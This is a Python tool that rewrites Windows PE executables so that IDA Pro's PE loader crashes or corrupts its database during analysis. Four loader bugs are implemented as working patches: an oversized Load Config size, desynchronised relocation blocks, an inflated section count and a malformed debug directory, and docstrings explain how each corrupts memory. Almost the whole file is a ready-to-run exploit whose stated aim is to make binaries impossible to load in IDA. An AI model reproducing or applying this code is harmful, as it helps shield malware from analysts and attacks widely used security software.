"""
PE Anti-Analysis Protection Tool
=================================
Applies IDA Pro pe.dll loader vulnerabilities to a PE binary on disk.
This makes the binary crash IDA's PE loader during auto-analysis.

Vulnerabilities implemented:
  1. Load Config Directory Size=0xFFFFFFFF -> OOB IDB reads -> set_name() crash
  2. Relocation SizeOfBlock=4 desync -> wild put_dword/put_qword writes
  3. NumberOfSections=0xFFFF in header -> del_items on oversized range
  4. Debug Directory Type OOB + oversized SizeOfData

Usage:
  python pe_protect.py <input.exe> [output.exe] [--vulns 1,2,3,4]
"""

import struct
import sys
import os
import shutil
import argparse

IMAGE_DOS_SIGNATURE          = 0x5A4D
IMAGE_NT_SIGNATURE           = 0x00004550
IMAGE_FILE_MACHINE_AMD64     = 0x8664
IMAGE_FILE_MACHINE_I386      = 0x014C

PE32_MAGIC                   = 0x10B
PE32PLUS_MAGIC               = 0x20B

IMAGE_DIRECTORY_ENTRY_EXPORT    = 0
IMAGE_DIRECTORY_ENTRY_IMPORT    = 1
IMAGE_DIRECTORY_ENTRY_RESOURCE  = 2
IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3
IMAGE_DIRECTORY_ENTRY_SECURITY  = 4
IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
IMAGE_DIRECTORY_ENTRY_DEBUG     = 6
IMAGE_DIRECTORY_ENTRY_TLS       = 9
IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
IMAGE_DIRECTORY_ENTRY_IAT       = 12

IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
IMAGE_SCN_MEM_READ             = 0x40000000
IMAGE_SCN_MEM_DISCARDABLE      = 0x02000000

IMAGE_REL_BASED_ABSOLUTE       = 0
IMAGE_REL_BASED_HIGHLOW        = 3
IMAGE_REL_BASED_DIR64          = 10

IMAGE_DEBUG_TYPE_CODEVIEW      = 2


def read_u16(data, off):
    return struct.unpack_from('<H', data, off)[0]

def read_u32(data, off):
    return struct.unpack_from('<I', data, off)[0]

def read_u64(data, off):
    return struct.unpack_from('<Q', data, off)[0]

def write_u16(data, off, val):
    struct.pack_into('<H', data, off, val & 0xFFFF)

def write_u32(data, off, val):
    struct.pack_into('<I', data, off, val & 0xFFFFFFFF)

def write_u64(data, off, val):
    struct.pack_into('<Q', data, off, val & 0xFFFFFFFFFFFFFFFF)


class PEFile:
    """Minimal PE parser for targeted field manipulation."""

    def __init__(self, path):
        with open(path, 'rb') as f:
            self.data = bytearray(f.read())

        if len(self.data) < 64:
            raise ValueError("File too small to be a PE")

        dos_sig = read_u16(self.data, 0)
        if dos_sig != IMAGE_DOS_SIGNATURE:
            raise ValueError(f"Invalid DOS signature: 0x{dos_sig:04X}")

        self.pe_offset = read_u32(self.data, 0x3C)
        if self.pe_offset + 4 > len(self.data):
            raise ValueError("PE header offset out of bounds")

        nt_sig = read_u32(self.data, self.pe_offset)
        if nt_sig != IMAGE_NT_SIGNATURE:
            raise ValueError(f"Invalid NT signature: 0x{nt_sig:08X}")

        self.coff_offset = self.pe_offset + 4
        self.machine = read_u16(self.data, self.coff_offset)
        self.num_sections = read_u16(self.data, self.coff_offset + 2)
        self.optional_hdr_size = read_u16(self.data, self.coff_offset + 16)

        self.opt_offset = self.coff_offset + 20
        self.opt_magic = read_u16(self.data, self.opt_offset)
        self.is_pe64 = (self.opt_magic == PE32PLUS_MAGIC)

        if self.is_pe64:
            self.num_rva_and_sizes_off = self.opt_offset + 108
            self.datadir_offset = self.opt_offset + 112
            self.imagebase = read_u64(self.data, self.opt_offset + 24)
            self.section_alignment = read_u32(self.data, self.opt_offset + 32)
            self.file_alignment = read_u32(self.data, self.opt_offset + 36)
            self.size_of_image_off = self.opt_offset + 56
        else:
            self.num_rva_and_sizes_off = self.opt_offset + 92
            self.datadir_offset = self.opt_offset + 96
            self.imagebase = read_u32(self.data, self.opt_offset + 28)
            self.section_alignment = read_u32(self.data, self.opt_offset + 32)
            self.file_alignment = read_u32(self.data, self.opt_offset + 36)
            self.size_of_image_off = self.opt_offset + 56

        self.num_data_dirs = read_u32(self.data, self.num_rva_and_sizes_off)

        self.sections_offset = self.opt_offset + self.optional_hdr_size

    def get_datadir(self, index):
        """Return (rva, size) for a data directory entry."""
        if index >= self.num_data_dirs:
            return (0, 0)
        off = self.datadir_offset + index * 8
        return (read_u32(self.data, off), read_u32(self.data, off + 4))

    def set_datadir(self, index, rva, size):
        """Set a data directory entry."""
        while index >= self.num_data_dirs:
            self.num_data_dirs = index + 1
            write_u32(self.data, self.num_rva_and_sizes_off, self.num_data_dirs)
        off = self.datadir_offset + index * 8
        write_u32(self.data, off, rva)
        write_u32(self.data, off + 4, size)

    def get_section_header(self, idx):
        """Return dict with section header fields."""
        off = self.sections_offset + idx * 40
        name_bytes = self.data[off:off+8]
        return {
            'offset': off,
            'name': name_bytes.rstrip(b'\x00').decode('ascii', errors='replace'),
            'virtual_size': read_u32(self.data, off + 8),
            'virtual_address': read_u32(self.data, off + 12),
            'raw_size': read_u32(self.data, off + 16),
            'raw_offset': read_u32(self.data, off + 20),
            'characteristics': read_u32(self.data, off + 36),
        }

    def rva_to_file_offset(self, rva):
        """Convert RVA to file offset using section table."""
        for i in range(self.num_sections):
            sec = self.get_section_header(i)
            va = sec['virtual_address']
            vs = sec['virtual_size']
            rs = sec['raw_size']
            ro = sec['raw_offset']
            if va <= rva < va + max(vs, rs):
                return ro + (rva - va)
        return None

    def align_up(self, value, alignment):
        if alignment == 0:
            return value
        return (value + alignment - 1) & ~(alignment - 1)

    def get_size_of_image(self):
        return read_u32(self.data, self.size_of_image_off)

    def set_size_of_image(self, val):
        write_u32(self.data, self.size_of_image_off, val)

    def save(self, path):
        with open(path, 'wb') as f:
            f.write(self.data)


def find_or_add_section(pe, name, min_raw_size, characteristics):
    """Find existing section by name or append a new one."""
    for i in range(pe.num_sections):
        sec = pe.get_section_header(i)
        if sec['name'] == name:
            return sec

    new_idx = pe.num_sections
    new_hdr_off = pe.sections_offset + new_idx * 40

    first_sec = pe.get_section_header(0) if pe.num_sections > 0 else None
    if first_sec and new_hdr_off + 40 > first_sec['raw_offset']:
        raise RuntimeError("No room for additional section header")

    last_sec = pe.get_section_header(pe.num_sections - 1) if pe.num_sections > 0 else None
    if last_sec:
        new_va = pe.align_up(
            last_sec['virtual_address'] + max(last_sec['virtual_size'], last_sec['raw_size']),
            pe.section_alignment
        )
        new_raw_off = pe.align_up(
            last_sec['raw_offset'] + last_sec['raw_size'],
            pe.file_alignment
        )
    else:
        new_va = pe.align_up(pe.optional_hdr_size + pe.sections_offset - pe.pe_offset, pe.section_alignment)
        new_raw_off = pe.align_up(len(pe.data), pe.file_alignment)

    raw_size = pe.align_up(min_raw_size, pe.file_alignment)

    needed = new_raw_off + raw_size
    if needed > len(pe.data):
        pe.data.extend(b'\x00' * (needed - len(pe.data)))

    name_bytes = name.encode('ascii')[:8].ljust(8, b'\x00')
    pe.data[new_hdr_off:new_hdr_off+8] = name_bytes
    write_u32(pe.data, new_hdr_off + 8, min_raw_size)
    write_u32(pe.data, new_hdr_off + 12, new_va)
    write_u32(pe.data, new_hdr_off + 16, raw_size)
    write_u32(pe.data, new_hdr_off + 20, new_raw_off)
    write_u32(pe.data, new_hdr_off + 24, 0)
    write_u32(pe.data, new_hdr_off + 28, 0)
    write_u16(pe.data, new_hdr_off + 32, 0)
    write_u16(pe.data, new_hdr_off + 34, 0)
    write_u32(pe.data, new_hdr_off + 36, characteristics)

    pe.num_sections = new_idx + 1
    write_u16(pe.data, pe.coff_offset + 2, pe.num_sections)

    new_size_of_image = pe.align_up(new_va + min_raw_size, pe.section_alignment)
    if new_size_of_image > pe.get_size_of_image():
        pe.set_size_of_image(new_size_of_image)

    return {
        'offset': new_hdr_off,
        'name': name,
        'virtual_size': min_raw_size,
        'virtual_address': new_va,
        'raw_size': raw_size,
        'raw_offset': new_raw_off,
        'characteristics': characteristics,
    }

def apply_vuln1_load_config(pe):
    """
    Poison the Load Config Directory so that IDA's sub_140002210 (PE64) or
    sub_140003B90 (PE32) reads Size=0xFFFFFFFF from the directory content.

    The bug: the loader reads IMAGE_LOAD_CONFIG_DIRECTORY.Size from IDB data
    and only checks `if (Size < 0x60) return;`. With Size=0xFFFFFFFF, all
    subsequent `if (offset <= Size)` checks pass, causing get_qword() on
    addresses far beyond the actual section data. The returned garbage values
    are passed to set_name() -> B-tree corruption -> interr() crash.
    """
    print("[VULN1] Applying Load Config Directory Size overflow...")

    if pe.is_pe64:
        lc_content_size = 0x100
    else:
        lc_content_size = 0x80

    lc_rva, lc_dir_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG)

    if lc_rva != 0:
        file_off = pe.rva_to_file_offset(lc_rva)
        if file_off is not None:
            write_u32(pe.data, file_off, 0xFFFFFFFF)
            print(f"  Patched existing Load Config at RVA 0x{lc_rva:08X}, "
                  f"file offset 0x{file_off:08X}")
            print(f"  Size field set to 0xFFFFFFFF (was checked against >= 0x60)")
            return True
    else:
        sec = find_or_add_section(
            pe, '.lcfg',
            lc_content_size,
            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
        )

        lc_file_off = sec['raw_offset']
        lc_rva = sec['virtual_address']

        write_u32(pe.data, lc_file_off, 0xFFFFFFFF)

        if pe.is_pe64:
            write_u64(pe.data, lc_file_off + 88, pe.imagebase + 0x1000)
            write_u64(pe.data, lc_file_off + 96, pe.imagebase + 0x2000)
            write_u64(pe.data, lc_file_off + 104, pe.imagebase + 0x3000)
        else:
            write_u32(pe.data, lc_file_off + 60, pe.imagebase + 0x1000)
            write_u32(pe.data, lc_file_off + 64, pe.imagebase + 0x2000)

        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG, lc_rva, lc_content_size)

        print(f"  Created .lcfg section at RVA 0x{lc_rva:08X}")
        print(f"  Load Config Size = 0xFFFFFFFF, actual section = 0x{lc_content_size:X} bytes")
        print(f"  IDA will read ~300+ bytes of Load Config fields beyond section boundary")
        return True

def apply_vuln2_reloc_desync(pe):
    """
    Craft a .reloc section with thousands of IMAGE_BASE_RELOCATION blocks
    where SizeOfBlock=4 (less than the 8-byte header).

    The bug in sub_1400072E0: the pointer advances by 8 bytes (header size)
    but the remaining-bytes tracker only decreases by min(SizeOfBlock, remaining)
    = min(4, remaining) = 4. This 4-byte-per-iteration desync causes the
    pointer to race ahead, eventually interpreting relocation entries as block
    headers with wild VirtualAddress values -> put_dword/put_qword on
    arbitrary IDB addresses -> corruption -> interr() crash.
    """
    print("[VULN2] Applying Relocation SizeOfBlock desync...")

    num_blocks = 10000
    block_data = bytearray()

    for i in range(num_blocks):
        page_rva = 0x1000 + (i % 256) * 0x1000
        block_data += struct.pack('<I', page_rva)
        block_data += struct.pack('<I', 4)
    reloc_size = len(block_data)

    reloc_rva, reloc_dir_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC)

    if reloc_rva != 0:
        file_off = pe.rva_to_file_offset(reloc_rva)
        if file_off is not None:
            for i in range(pe.num_sections):
                sec = pe.get_section_header(i)
                if sec['virtual_address'] <= reloc_rva < sec['virtual_address'] + max(sec['virtual_size'], sec['raw_size']):
                    available = sec['raw_size'] - (reloc_rva - sec['virtual_address'])
                    if available < reloc_size:
                        block_data = block_data[:available]
                        reloc_size = available
                    pe.data[file_off:file_off + reloc_size] = block_data[:reloc_size]
                    pe.set_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC, reloc_rva, reloc_size)
                    print(f"  Patched existing .reloc at RVA 0x{reloc_rva:08X}")
                    print(f"  {reloc_size // 8} blocks with SizeOfBlock=4")
                    return True
    else:
        sec = find_or_add_section(
            pe, '.reloc',
            reloc_size,
            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE
        )

        file_off = sec['raw_offset']
        pe.data[file_off:file_off + reloc_size] = block_data

        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC, sec['virtual_address'], reloc_size)

        print(f"  Created .reloc section at RVA 0x{sec['virtual_address']:08X}")
        print(f"  {num_blocks} blocks with SizeOfBlock=4 (8-byte header, 4-byte tracker)")
        print(f"  Pointer/remaining desync = 4 bytes/iteration -> buffer over-read")
        return True

    print("  WARNING: Could not apply relocation desync")
    return False

def apply_vuln3_sections_overflow(pe):
    """
    Set NumberOfSections to 0xFFFF in the COFF header.

    The bug in sub_140009220: the function reads NumberOfSections via
    get_word() and calls del_items(addr, 3, 40 * NumberOfSections, 0).
    With 0xFFFF sections: 40 * 65535 = 2,621,400 bytes passed to del_items.
    The header segment is typically 0x200-0x1000 bytes, so del_items operates
    far beyond the segment boundary, corrupting adjacent IDB data.

    The subsequent loop iterates 65535 times calling create_data, set_cmt,
    set_op_type, and op_offset_ex on each 40-byte entry - most beyond loaded data.
    """
    print("[VULN3] Applying NumberOfSections overflow...")

    original = read_u16(pe.data, pe.coff_offset + 2)

    write_u16(pe.data, pe.coff_offset + 2, 0xFFFF)

    print(f"  COFF NumberOfSections: 0x{original:04X} -> 0xFFFF")
    print(f"  del_items will process 40 * 65535 = 2,621,400 bytes")
    print(f"  Typical header segment is 0x200-0x1000 bytes -> massive OOB")

    pe.num_sections = original
    return True

def apply_vuln4_debug_dir(pe):
    """
    Craft a debug directory entry with oversized SizeOfData and
    AddressOfRawData pointing outside loaded segments.

    The bug in sub_140008850: the function reads the Type field and uses it
    as an array index into off_140023860[17]. While the bounds check is
    correct (< 0x11), the SizeOfData and AddressOfRawData fields are not
    validated. Setting SizeOfData to a huge value and AddressOfRawData to
    an unmapped RVA causes sub_140008DB0 to process unmapped memory.
    """
    print("[VULN4] Applying Debug Directory corruption...")

    debug_entry = bytearray(28)

    struct.pack_into('<I', debug_entry, 12, IMAGE_DEBUG_TYPE_CODEVIEW)

    struct.pack_into('<I', debug_entry, 16, 0xFFFFFFFF)

    struct.pack_into('<I', debug_entry, 20, 0x7FFE0000)

    struct.pack_into('<I', debug_entry, 24, 0)

    debug_rva, debug_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG)

    if debug_rva != 0:
        file_off = pe.rva_to_file_offset(debug_rva)
        if file_off is not None:
            pe.data[file_off:file_off + 28] = debug_entry
            pe.set_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG, debug_rva, 28)
            print(f"  Patched existing debug directory at RVA 0x{debug_rva:08X}")
            print(f"  SizeOfData = 0xFFFFFFFF, AddressOfRawData = 0x7FFE0000")
            return True
    else:
        sec = find_or_add_section(
            pe, '.dbgp',
            28,
            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
        )

        file_off = sec['raw_offset']
        pe.data[file_off:file_off + 28] = debug_entry

        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG, sec['virtual_address'], 28)

        print(f"  Created .dbgp section at RVA 0x{sec['virtual_address']:08X}")
        print(f"  Debug Type=CODEVIEW, SizeOfData=0xFFFFFFFF")
        print(f"  AddressOfRawData=0x7FFE0000 (unmapped)")
        return True

    print("  WARNING: Could not apply debug directory corruption")
    return False


def main():
    parser = argparse.ArgumentParser(
        description='PE Anti-Analysis Protection Tool - IDA pe.dll Loader Crash Generator'
    )
    parser.add_argument('input', help='Input PE file path')
    parser.add_argument('output', nargs='?', default=None,
                        help='Output PE file path (default: <input>_protected.exe)')
    parser.add_argument('--vulns', default='1,2,3,4',
                        help='Comma-separated vulnerability numbers to apply (default: 1,2,3,4)')

    args = parser.parse_args()

    if not os.path.isfile(args.input):
        print(f"Error: Input file not found: {args.input}")
        sys.exit(1)

    if args.output is None:
        base, ext = os.path.splitext(args.input)
        args.output = f"{base}_protected{ext}"

    vulns = set()
    for v in args.vulns.split(','):
        v = v.strip()
        if v:
            vulns.add(int(v))

    shutil.copy2(args.input, args.output)

    print(f"Loading PE: {args.input}")
    pe = PEFile(args.output)
    print(f"  Machine: 0x{pe.machine:04X} ({'PE64' if pe.is_pe64 else 'PE32'})")
    print(f"  Sections: {pe.num_sections}")
    print(f"  ImageBase: 0x{pe.imagebase:016X}" if pe.is_pe64 else f"  ImageBase: 0x{pe.imagebase:08X}")
    print()

    applied = []

    if 1 in vulns:
        if apply_vuln1_load_config(pe):
            applied.append(1)
        print()

    if 2 in vulns:
        if apply_vuln2_reloc_desync(pe):
            applied.append(2)
        print()

    if 4 in vulns:
        if apply_vuln4_debug_dir(pe):
            applied.append(4)
        print()

    if 3 in vulns:
        if apply_vuln3_sections_overflow(pe):
            applied.append(3)
        print()

    pe.save(args.output)

    print(f"Protected PE saved to: {args.output}")
    print(f"Vulnerabilities applied: {applied}")
    if {1, 2}.issubset(set(applied)):
        print("Both Load Config + Relocation vulns applied -> binary is impossible to load in IDA")


if __name__ == '__main__':
    main()
